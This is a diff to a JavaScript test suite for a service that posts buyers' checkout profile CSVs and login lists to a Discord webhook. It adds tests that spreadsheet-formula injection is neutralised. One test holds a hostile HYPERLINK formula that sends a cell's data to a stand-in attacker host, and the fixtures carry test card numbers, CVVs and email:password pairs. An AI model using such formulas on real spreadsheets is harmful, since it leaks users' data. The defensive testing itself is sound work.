@@ -150,6 +150,25 @@ async function signIn(r, code, extra = "") {
   return { loc, state, page: await get(`/discord/callback?state=${encodeURIComponent(state)}${code ? "&code=" + code : ""}${extra}`) };
 }
 const admin = (path, body) => fetch(BASE + path, { method: body ? "POST" : "GET", headers: { authorization: "Bearer test-admin-token", "content-type": "application/json" }, body: body && JSON.stringify(body) });
+// Slot CSVs reach the channel with number cells (and any cell starting with = + - @) as ="…" Excel text.
+// csvRows parses a CSV; asShown parses one and reads each ="…" cell (parts joined with &) as Excel shows it.
+function csvRows(text) {
+  const rows = []; let row = [], cur = "", q = false;
+  for (let i = 0; i < text.length; i++) {
+    const ch = text[i];
+    if (q) { if (ch === '"') { if (text[i + 1] === '"') { cur += '"'; i++; } else q = false; } else cur += ch; }
+    else if (ch === '"') q = true;
+    else if (ch === ",") { row.push(cur); cur = ""; }
+    else if (ch === "\n" || ch === "\r") { if (ch === "\r" && text[i + 1] === "\n") i++; row.push(cur); rows.push(row); row = []; cur = ""; }
+    else cur += ch;
+  }
+  if (cur || row.length) { row.push(cur); rows.push(row); }
+  return rows;
+}
+const EXCEL_STRINGS = /^=(?:"(?:[^"]|"")*")(?:&"(?:[^"]|"")*")*$/;
+const shown = (v) => EXCEL_STRINGS.test(v) ? [...v.slice(1).matchAll(/"((?:[^"]|"")*)"/g)].map((m) => m[1].replace(/""/g, '"')).join("") : v;
+const asShown = (text) => csvRows(text).map((r) => r.map(shown));
+const cellT = (v) => /[",\n\r]/.test(v) ? `"${v.replace(/"/g, '""')}"` : v;
 
 try {
   console.log("Automatic mode");
@@ -833,7 +852,9 @@ try {
     const m = webhookPosts.at(-1);
     assert.ok(m.content.startsWith(`📦 **2 slots** from **Beta** · @frank · license …${frankKey.slice(-4)}\nTarget 2\n`), m.content);
     assert.ok(m.content.endsWith("\n-# CSV attached."), m.content);
-    assert.equal(m.files.length, 1); assert.equal(m.files[0].text, csv, "the CSV exactly as sent");
+    assert.equal(m.files.length, 1); assert.deepEqual(asShown(m.files[0].text), csvRows(csv), "the CSV as sent, as Excel shows it");
+    assert.equal(m.files[0].text.split("\r\n")[1], 'Kim Lee,Beta,kim@example.com,"=""4242424242424242""","=""123""",kim.target@example.com,"pa,ss""word"', "card number and CVV as Excel text");
+    assert.ok(m.files[0].text.endsWith("\r\n"), "ends as it did");
     assert.match(m.files[0].name, /^orbit-slots-\d{4}-\d\d-\d\d-\d{4}-Beta\.csv$/);
     assert.match(m.files[0].type, /^text\/csv/);
     assert.equal(m.allowed_mentions.parse.length, 0);
@@ -904,8 +925,30 @@ try {
     assert.ok(m.content.startsWith(`📦 **3 slots** from **Beta** · @frank · license …${frankKey.slice(-4)}\nTarget 1 · Walmart 1 (1 needs an account) · Pokémon Center 1\n`), m.content);
     assert.ok(m.content.endsWith("\n-# One profiles file (.csv) per store, with its logins (email:password, .txt) in the same order. Profiles that need an account come last."), m.content);
     assert.deepEqual(m.files.map((f) => f.name.replace(/^orbit-slots-\d{4}-\d\d-\d\d-\d{4}-/, "")), ["Beta-target.csv", "Beta-target-logins.txt", "Beta-walmart.csv", "Beta-pokemon-center.csv"]);
-    assert.deepEqual(m.files.map((f) => f.text), files.map((f) => f.text), "each file exactly as sent");
+    assert.deepEqual(m.files.map((f) => asShown(f.text)), files.map((f) => csvRows(f.text)), "each file as sent, as Excel shows it");
+    assert.equal(m.files[1].text, files[1].text, "the logins file exactly as sent");
     assert.match(m.files[0].type, /^text\/csv/); assert.match(m.files[1].type, /^text\/plain/);
+  });
+  const slotHead = tgtCsv.split("\r\n")[0];
+  await test("number cells go out as Excel text, so the full card number and leading zeros show", async () => {
+    const sent = slotHead + "\r\nAnn One,Ann,One,ann@example.com,+15550100,5555555555554444,09,2031,053,1 Main St,,Boston,MA,02139,US,Ann,One,1 Main St,,Boston,MA,02139,US";
+    const r = await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: sent }], name: "Beta", slots: 1, batch: "xl" + rid() });
+    assert.equal(r.status, 200);
+    const got = webhookPosts.at(-1).files[0].text.split("\r\n");
+    assert.equal(got[0], slotHead, "the header as sent");
+    assert.equal(got[1], 'Ann One,Ann,One,ann@example.com,"=""+15550100""","=""5555555555554444""","=""09""",2031,"=""053""",1 Main St,,Boston,MA,"=""02139""",US,Ann,One,1 Main St,,Boston,MA,"=""02139""",US');
+  });
+  await test("a buyer's cell that starts with = + - or @ goes out as text, never as a formula", async () => {
+    const evil = '=HYPERLINK("http://evil.example/?"&F2,"Click")', long = "=" + "x".repeat(600);
+    const row = [evil, "Ann", "One", "ann@example.com", "5550100", "4242424242424242", "07", "2029", "123", "+1 Main St", "-", "@home", "TX", "78701", "US", "Ann", "One", long, "", "Austin", "TX", "78701", "US"];
+    const r = await slots("/submissions", frankKey, { files: [{ store: "Target", kind: "profiles", text: slotHead + "\r\n" + row.map(cellT).join(",") }], name: "Beta", slots: 1, batch: "xl" + rid() });
+    assert.equal(r.status, 200);
+    const posted = csvRows(webhookPosts.at(-1).files[0].text)[1];
+    assert.equal(posted[0], '="=HYPERLINK(""http://evil.example/?""&F2,""Click"")"');
+    assert.deepEqual([posted[9], posted[10], posted[11]], ['="+1 Main St"', '="-"', '="@home"']);
+    assert.match(posted[17], /^="=x{249}"&"x{250}"&"x{101}"$/, "a long one in parts of 250 at most, which Excel takes");
+    assert.deepEqual(posted.map(shown), row, "Excel shows exactly what was typed");
+    for (const v of posted) assert.ok(!/^[=+\-@]/.test(v) || EXCEL_STRINGS.test(v), "nothing that runs but plain strings: " + v);
   });
   await test("per-store files need a store, a kind, some text, and at least one profiles CSV", async () => {
     for (const files of [
@@ -925,7 +968,7 @@ try {
     assert.deepEqual(posts.map((m) => m.files.length), [10, 10, 4]);
     assert.ok(posts[0].content.startsWith("📦 **12 slots** from **Beta**"), posts[0].content);
     assert.equal(posts[1].content, `-# More files for the batch from **Beta** · @frank · license …${frankKey.slice(-4)} (11–20 of 24).`);
-    assert.deepEqual(posts.flatMap((m) => m.files.map((f) => f.text)), files.map((f) => f.text), "every file, in order");
+    assert.deepEqual(posts.flatMap((m) => m.files.map((f) => asShown(f.text))), files.map((f) => csvRows(f.text)), "every file, in order");
   });
   await test("if a follow-up message fails, the app is told, and sending again posts every file", async () => {
     const files = [];
@@ -976,7 +1019,7 @@ try {
     assert.deepEqual(r.accounts, { Target: { asked: 1, got: 0 } });
     const m = webhookPosts.at(-1);
     assert.match(m.content, /\nTarget 1 \(1 needs an account\)\n/); assert.match(m.content, /Profiles that need an account come last\.$/);
-    assert.deepEqual(m.files.map((f) => f.text), [files[0].text], "no logins file, the CSV untouched");
+    assert.deepEqual(m.files.map((f) => asShown(f.text)), [csvRows(files[0].text)], "no logins file, the CSV as sent");
   });
   await test("adding them from the review link puts them on the list", async () => {
     assert.match(await (await offerPost(reviewLink, "add")).text(), /Added 13 to your list\./);
@@ -1002,9 +1045,9 @@ try {
     const em = emailsIn(csvF.text);
     assert.equal(em[0], "kim@example.com"); assert.equal(em[3], "cy@example.com", "other rows as sent");
     assert.ok(/^pool\d+@outlook\.com$/.test(em[1]) && /^pool\d+@outlook\.com$/.test(em[2]) && em[1] !== em[2], em);
-    assert.equal(csvF.text.split("\r\n")[2].replace(em[1], "ann@example.com"), slotRow("Ann One", "ann@example.com"), "quoted cells come through");
+    assert.deepEqual(asShown(csvF.text)[2].map((v) => v === em[1] ? "ann@example.com" : v), csvRows(slotRow("Ann One", "ann@example.com"))[0], "quoted cells come through");
     assert.equal(logF.text, `kim.target@example.com:pa:ss\r\n${em[1]}:Test-Pw-1!\r\n${em[2]}:Test-Pw-1!`);
-    assert.equal(wmF.text, files[2].text, "no Walmart list: as sent");
+    assert.deepEqual(asShown(wmF.text), csvRows(files[2].text), "no Walmart list: as sent");
     first = [em[1], em[2]];
     const d = await accounts();
     assert.deepEqual(d.stores, [{ store: "target", total: 13, free: 11, sent: 2 }]);
@@ -1087,7 +1130,7 @@ try {
     const r = await (await slots("/submissions", bobKey, { files, name: "Bob", slots: 1, batch: "asg7" + rid(), stores: [{ name: "Target", n: 1, seller: 1 }] })).json();
     assert.equal(r.accounts, undefined);
     const m = webhookPosts.at(-1);
-    assert.match(m.content, /\nTarget 1 \(1 needs an account\)\n/); assert.deepEqual(m.files.map((f) => f.text), [files[0].text]);
+    assert.match(m.content, /\nTarget 1 \(1 needs an account\)\n/); assert.deepEqual(m.files.map((f) => asShown(f.text)), [csvRows(files[0].text)]);
   });
   await test("an offer nobody decided on expires, and its accounts are dropped", async () => {
     await slots("/accounts/offer", ginaKey, { store: "nike", storeName: "Nike", accounts: [{ email: "n1@outlook.com", password: "x1" }] });
